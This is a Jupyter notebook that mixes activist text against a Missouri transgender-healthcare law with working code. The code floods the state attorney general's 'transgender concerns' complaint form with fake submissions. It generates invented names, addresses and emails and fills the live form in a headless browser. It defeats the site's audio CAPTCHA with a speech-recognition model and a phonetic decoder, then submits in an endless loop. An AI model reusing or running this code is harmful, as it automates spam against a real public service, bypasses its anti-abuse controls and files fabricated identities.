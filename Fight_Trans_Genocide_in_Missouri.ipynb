{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YkSi3d6NqfR9"
      },
      "source": [
        "# The Message\n",
        "\n",
        "## Missouri's new law that limits access to transgender healthcare is a violation of basic human rights and dignity.\n",
        "\n",
        "Denying healthcare to a group of people simply because of their gender identity is discriminatory and unjust.\n",
        "\n",
        "Transgender individuals face numerous challenges, including discrimination, violence, and mental health issues. Access to healthcare is crucial for their well-being and survival. Denying them medical treatment only exacerbates their struggles and denies them the basic human right to health.\n",
        "\n",
        "Moreover, limiting access to healthcare for transgender individuals goes against the medical community's consensus that gender-affirming care is necessary for transgender people's physical and mental health. Denying them access to healthcare is not only unjust but also puts their lives at risk.\n",
        "\n",
        "Therefore, Missouri should repeal this law and ensure that all individuals, regardless of their gender identity, have equal access to healthcare.\n",
        "\n",
        "## We must stand up against discrimination and ensure that everyone has the opportunity to lead a healthy and fulfilling life."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "beagAGw5t5bK"
      },
      "outputs": [],
      "source": [
        "%%capture apt\n",
        "!apt-get update\n",
        "!apt install libxtst6\n",
        "!apt install chromium-chromedriver"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "G950_VMWjUOY"
      },
      "source": [
        "## The creation of a website for reporting \"transgender concerns\" by the Missouri district attorney is deeply concerning and has the potential to perpetuate discrimination and violence against the transgender community.\n",
        "\n",
        "It is important to recognize the historical context of registries and the devastating impact they have had on marginalized groups, particularly in the context of genocide."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "iu8zEZyVALlM"
      },
      "outputs": [],
      "source": [
        "%%capture pip\n",
        "!curl https://raw.githubusercontent.com/speechbrain/speechbrain/develop/requirements.txt > ./requirements.txt\n",
        "!pip install -r requirements.txt\n",
        "!pip install speechbrain chance nest-asyncio pyppeteer transformers\n",
        "!pip install ipython ipykernel --upgrade"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kmZRarSIjWwe"
      },
      "source": [
        "## Registries have been used throughout history to target and discriminate against specific groups of people, often leading to horrific outcomes.\n",
        "\n",
        "For example, during the Holocaust, the Nazis created a registry of Jews that ultimately led to the genocide of six million Jewish people. More recently, the US government created a registry of Muslim immigrants, which was later found to be discriminatory and was shut down."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "w4vM8D2AngEF"
      },
      "outputs": [],
      "source": [
        "import random\n",
        "from chance import chance\n",
        "\n",
        "def get_form():\n",
        "  firstName = chance.first()\n",
        "  lastName = chance.last()\n",
        "  street = \"%s %s\" % (random.randint(100, 9999), chance.street())\n",
        "  city = chance.city()\n",
        "  state = 'MO'\n",
        "  zip = str(random.randint(63001, 65899))\n",
        "  phone = ''\n",
        "\n",
        "  message = '''\n",
        "  Missouri's new law that limits access to transgender healthcare is a violation of basic human rights and dignity. Denying healthcare to a group of people simply because of their gender identity is discriminatory and unjust.\n",
        "\n",
        "  Transgender individuals face numerous challenges, including discrimination, violence, and mental health issues. Access to healthcare is crucial for their well-being and survival. Denying them medical treatment only exacerbates their struggles and denies them the basic human right to health.\n",
        "\n",
        "  Moreover, limiting access to healthcare for transgender individuals goes against the medical community's consensus that gender-affirming care is necessary for transgender people's physical and mental health. Denying them access to healthcare is not only unjust but also puts their lives at risk.\n",
        "\n",
        "  Therefore, Missouri should repeal this law and ensure that all individuals, regardless of their gender identity, have equal access to healthcare. We must stand up against discrimination and ensure that everyone has the opportunity to lead a healthy and fulfilling life.\n",
        "  '''\n",
        "\n",
        "  emailPrefix = chance.pickone([\n",
        "    '%s%s' % (firstName, lastName),\n",
        "    '%s%s' % (firstName[0], lastName),\n",
        "    '%s%s' % (firstName, lastName[0]),\n",
        "    '%s.%s' % (firstName, lastName),\n",
        "    '%s.%s' % (firstName[0], lastName),\n",
        "    '%s.%s' % (firstName, lastName[0]),\n",
        "    '%s%s%s' % (firstName, lastName, random.randint(100, 999)),\n",
        "    '%s%s%s' % (firstName[0], lastName, random.randint(100, 999)),\n",
        "    '%s%s%s' % (firstName, lastName[0], random.randint(100, 999)),\n",
        "    '%s.%s%s' % (firstName, lastName, random.randint(100, 999)),\n",
        "    '%s.%s%s' % (firstName[0], lastName, random.randint(100, 999)),\n",
        "    '%s.%s%s' % (firstName, lastName[0], random.randint(100, 999)),\n",
        "    '%s%s.%s' % (firstName, lastName, random.randint(100, 999)),\n",
        "    '%s%s.%s' % (firstName[0], lastName, random.randint(100, 999)),\n",
        "    '%s%s.%s' % (firstName, lastName[0], random.randint(100, 999)),\n",
        "    '%s.%s.%s' % (firstName, lastName, random.randint(100, 999)),\n",
        "    '%s.%s.%s' % (firstName[0], lastName, random.randint(100, 999)),\n",
        "    '%s.%s.%s' % (firstName, lastName[0], random.randint(100, 999)),\n",
        "  ]).replace(' ', '').lower()\n",
        "\n",
        "  emailDomain = chance.pickone([\n",
        "    chance.domain(),\n",
        "    chance.pickone([\n",
        "      'aol.com',\n",
        "      'gmail.com',\n",
        "      'yahoo.com',\n",
        "      'outlook.com',\n",
        "      'protonmail.com',\n",
        "    ])\n",
        "  ])\n",
        "\n",
        "  email = chance.pickone([\n",
        "    chance.email(),\n",
        "    chance.email(dom=emailDomain),\n",
        "    '%s@%s' % (emailPrefix, emailDomain)\n",
        "  ])\n",
        "\n",
        "  return {\n",
        "    'firstName': firstName,\n",
        "    'lastName': lastName,\n",
        "    'email': email,\n",
        "    'street': street,\n",
        "    'city': city,\n",
        "    'state': state,\n",
        "    'zip': zip,\n",
        "    'phone': phone,\n",
        "    'message': message\n",
        "  }\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yGrn6rgxjbpF"
      },
      "source": [
        "## The creation of a registry for transgender individuals is not only discriminatory but could also be a prelude to more severe forms of violence and oppression.\n",
        "Such a registry could be used to track, target, and harm transgender individuals, and it could also create an environment of fear and intimidation, leading to a decrease in the community's access to essential services and resources."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "14OOSJ6SnvBv"
      },
      "outputs": [],
      "source": [
        "mapping_dict = {\n",
        "  'A': ['ALPHA', 'BELFA'],\n",
        "  'B': ['BRAVO'],\n",
        "  'C': ['CHARLIE'],\n",
        "  'D': ['DELTA'],\n",
        "  'E': ['ECHO'],\n",
        "  'F': ['FOXTROT'],\n",
        "  'G': ['GAMMA'],\n",
        "  'H': ['HOTEL'],\n",
        "  'I': ['INDIA'],\n",
        "  'J': ['JULIET', 'JULIETT', 'JULIETTE', 'JULIA', 'JULIAN'],\n",
        "  'K': ['KILO', 'HILO', 'KI LO'],\n",
        "  'L': ['LIMA', 'PLYMOUTH', 'RHYMED'],\n",
        "  'M': ['MIKE'],\n",
        "  'N': ['NOVEMBER'],\n",
        "  'O': ['OSCAR', 'PROSPER'],\n",
        "  'P': ['PAPA', 'POPHAM'],\n",
        "  'Q': ['QUEBEC'],\n",
        "  'R': ['ROMEO', 'ROMYOE', 'RONALD'],\n",
        "  'S': ['SIERRA', 'THE GARRET', 'CERET', 'SEE TERRET'],\n",
        "  'T': ['TANGO', 'TANGLE'],\n",
        "  'U': ['UNIFORM'],\n",
        "  'V': ['VICTOR'],\n",
        "  'W': ['WHISKEY'],\n",
        "  'X': ['XRAY', 'EX RAY', 'X RAY'],\n",
        "  'Y': ['YANKEE'],\n",
        "  'Z': ['ZULU'],\n",
        "  '0': ['ZERO', 'VIRILE'],\n",
        "  '1': ['ONE'],\n",
        "  '2': ['TWO'],\n",
        "  '3': ['THREE'],\n",
        "  '4': ['FOUR', 'FOR'],\n",
        "  '5': ['FIVE'],\n",
        "  '6': ['SIX'],\n",
        "  '7': ['SEVEN'],\n",
        "  '8': ['EIGHT', 'ATE', 'EIGHTH', 'APE'],\n",
        "  '9': ['NINE']\n",
        "}\n",
        "\n",
        "def resolve_transcription(transcription):\n",
        "  matches = []\n",
        "  for letter in mapping_dict:\n",
        "    for word in mapping_dict[letter]:\n",
        "      while (word in transcription):\n",
        "        matches.append([letter, transcription.find(word)])\n",
        "        transcription = transcription.replace(word, (' ' * len(word)), 1)\n",
        "  return ''.join(list(map(lambda i:i[0], sorted(matches, key=lambda i:i[1]))))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UV4jWyhBsSe5"
      },
      "source": [
        "## It is crucial to resist the creation of such a registry and to stand up against any form of discrimination and violence against transgender individuals.\n",
        "\n",
        "Instead, we should work to create safe and inclusive environments that respect everyone's human rights and dignity. Transgender people deserve the same protections as everyone else, and any attempt to create a registry based on their identity is a violation of their basic human rights.\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "lDa_UnWK60tb"
      },
      "outputs": [],
      "source": [
        "import os\n",
        "import base64\n",
        "import asyncio\n",
        "import nest_asyncio\n",
        "from pyppeteer import launch\n",
        "from speechbrain.pretrained import EncoderDecoderASR\n",
        "\n",
        "nest_asyncio.apply()\n",
        "\n",
        "async def submit_form():\n",
        "  session = chance.hex_hash()\n",
        "  os.mkdir('./%s' % (session))\n",
        "\n",
        "  # model = EncoderDecoderASR.from_hparams('speechbrain/asr-wav2vec2-commonvoice-en')\n",
        "  # model = EncoderDecoderASR.from_hparams('speechbrain/asr-wav2vec2-librispeech')\n",
        "  # model = EncoderDecoderASR.from_hparams('speechbrain/asr-crdnn-rnnlm-librispeech')\n",
        "  model = EncoderDecoderASR.from_hparams('speechbrain/asr-transformer-transformerlm-librispeech')\n",
        "\n",
        "  browser = await launch({ 'args': ['--no-sandbox'], 'headless': True })\n",
        "\n",
        "  page = await browser.newPage()\n",
        "  await page.goto('https://ago.mo.gov/file-a-complaint/transgender-center-concerns')\n",
        "  await page.screenshot(path=('./%s/empty.png' % (session)), fullPage=True)\n",
        "\n",
        "  form = get_form()\n",
        "  await page.type('input[name=\"TextFieldController_0\"]', form['email'])\n",
        "  await page.type('input[name=\"TextFieldController_1\"]', form['street'])\n",
        "  await page.type('input[name=\"TextFieldController_2\"]', form['city'])\n",
        "  await page.type('input[name=\"TextFieldController_3\"]', form['phone'])\n",
        "  await page.type('input[name=\"TextFieldController_4\"]', form['firstName'])\n",
        "  await page.type('input[name=\"TextFieldController_5\"]', form['lastName'])\n",
        "  await page.type('input[name=\"TextFieldController_6\"]', form['zip'])\n",
        "  await page.type('select[name=\"DropdownListFieldController\"]', form['state'])\n",
        "  await page.type('textarea[name=\"ParagraphTextFieldController\"]', form['message'])\n",
        "\n",
        "  imageCaptchaNode = await page.waitForSelector('img[data-sf-role=\"captcha-image\"]')\n",
        "  imageCaptchaB64Data = await page.evaluate('e => e.getAttribute(\"src\")', imageCaptchaNode)\n",
        "  \n",
        "  audioCaptchaNode = await page.waitForSelector('audio[data-sf-role=\"captcha-audio\"]')\n",
        "  audioCaptchaB64Data = await page.evaluate('e => e.getAttribute(\"src\")', audioCaptchaNode)\n",
        "\n",
        "  if (imageCaptchaB64Data or audioCaptchaB64Data):\n",
        "    imageFile = './%s/captcha.png' % (session)\n",
        "    audioFile = './%s/captcha.wav' % (session)\n",
        "    \n",
        "    if (imageCaptchaB64Data):\n",
        "      with open(imageFile, 'wb') as f:\n",
        "        f.write(base64.b64decode(imageCaptchaB64Data.split(',')[1]))\n",
        "    \n",
        "    if (audioCaptchaB64Data):\n",
        "      with open(audioFile, 'wb') as f:\n",
        "        f.write(base64.b64decode(audioCaptchaB64Data.split(',')[1]))\n",
        "\n",
        "    print('Found captcha. Transcribing...')\n",
        "    transcription = model.transcribe_file(audioFile)\n",
        "    print('Transcription: \"%s\"' % (transcription))\n",
        "\n",
        "    code = resolve_transcription(transcription)\n",
        "    print('CAPTCHA: \"%s\"' % (code))\n",
        "    \n",
        "    await page.type('input[data-sf-role=\"captcha-input\"]', code)\n",
        "\n",
        "  await page.click('button[type=\"submit\"]')\n",
        "  await page.waitFor(2000)\n",
        "  await page.screenshot(path=('./%s/complete.png' % (session)), fullPage=True)\n",
        "  await browser.close()\n",
        "\n",
        "while (True):\n",
        "  asyncio.get_event_loop().run_until_complete(submit_form())"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "![The Ten Stages of Genocide](https://user-images.githubusercontent.com/114874765/233242905-2d8bb4a4-5ea4-4e81-b067-44b7230b1007.png)\n",
        "\n",
        "> ### 1. Classification\n",
        "> The differences between people are not respected. There’s a division of ‘us’ and ‘them’ which can be carried out using stereotypes, or excluding people who are perceived to be different.\n",
        ">\n",
        "> ### 2. Symbolisation\n",
        "> This is a visual manifestation of hatred. Jews in Nazi Europe were forced to wear yellow stars to show that they were ‘different’.\n",
        ">\n",
        "> ### 3. Discrimination\n",
        "> The dominant group denies civil rights or even citizenship to identified groups. The 1935 Nuremberg Laws stripped Jews of their German citizenship, made it illegal for them to do many jobs or to marry German non-Jews.\n",
        ">\n",
        "> ### 4. Dehumanisation\n",
        "> Those perceived as ‘different’ are treated with no form of human rights or personal dignity. During the Genocide against the Tutsi in Rwanda, Tutsis were referred to as ‘cockroaches’; the Nazis referred to Jews as ‘vermin’.\n",
        ">\n",
        "> ### 5. Organisation\n",
        "> Genocides are always planned. Regimes of hatred often train those who go on to carry out the destruction of a people.\n",
        ">\n",
        "> ### 6. Polarisation\n",
        "> Propaganda begins to be spread by hate groups. The Nazis used the newspaper Der Stürmer to spread and incite messages of hate about Jewish people.\n",
        ">\n",
        "> ### 7. Preparation\n",
        "> Perpetrators plan the genocide. They often use euphemisms such as the Nazis’ phrase ‘The Final Solution’ to cloak their intentions. They create fear of the victim group, building up armies and weapons.\n",
        ">\n",
        "> ### 8. Persecution _(you are here)_\n",
        "> Victims are identified because of their ethnicity or religion and death lists are drawn up. People are sometimes segregated into ghettos, deported or starved and property is often expropriated. Genocidal massacres begin.\n",
        ">\n",
        "> ### 9. Extermination\n",
        "> The hate group murders their identified victims in a deliberate and systematic campaign of violence. Millions of lives have been destroyed or changed beyond recognition through genocide.\n",
        ">\n",
        "> ### 10. Denial\n",
        "> The perpetrators or later generations deny the existence of any crime.\n",
        ">\n",
        "> _https://www.hmd.org.uk/learn-about-the-holocaust-and-genocides/what-is-genocide/the-ten-stages-of-genocide/_"
      ],
      "metadata": {
        "id": "x6I4JeLEM7ww"
      }
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "gpuClass": "standard",
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
